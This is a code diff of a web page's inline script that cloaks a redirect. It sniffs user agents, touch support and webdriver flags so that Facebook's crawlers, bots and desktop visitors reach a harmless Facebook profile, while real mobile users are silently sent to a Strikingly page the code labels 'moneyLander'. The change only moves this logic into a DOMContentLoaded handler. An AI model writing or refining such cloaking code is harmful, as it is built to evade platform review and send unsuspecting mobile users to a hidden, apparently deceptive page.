@@ -13,31 +13,32 @@
     <meta property="og:type" content="website">
 
     <script>
-        // Yahi hai tumhara WhatsApp Channel URL
-        const safeRedirect = "https://web.facebook.com/FawazAhmed01";
-        const moneyLander = "https://industrious-azalea-11v65rg.mystrikingly.com/";
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const safeRedirect = "https://web.facebook.com/FawazAhmed01";
+            const moneyLander = "https://industrious-azalea-11v65rg.mystrikingly.com/";
 
-        const ua = navigator.userAgent.toLowerCase();
-        
-        // 1. Known Bots Check
-        const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
-        const isAutomated = navigator.webdriver === true;
+            const ua = navigator.userAgent.toLowerCase();
+            
+            // 1. Known Bots Check
+            const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
+            const isAutomated = navigator.webdriver === true;
 
-        // 2. Hardware / Sensor Layer
-        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            // 2. Hardware / Sensor Layer
+            const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
 
-        // 3. Device Logic
-        const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
-        const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
+            // 3. Device Logic
+            const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
+            const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
 
-        // FINAL FILTER
-        if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
-            window.location.replace(safeRedirect);
-        } else if (isMobileOrTablet && hasTouchSupport) {
-            window.location.replace(moneyLander);
-        } else {
-            window.location.replace(safeRedirect);
-        }
+            // FINAL FILTER
+            if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
+                window.location.replace(safeRedirect);
+            } else if (isMobileOrTablet && hasTouchSupport) {
+                window.location.replace(moneyLander);
+            } else {
+                window.location.replace(safeRedirect);
+            }
+        });
     </script>
 </head>
 <body style="background-color: #ffffff;">
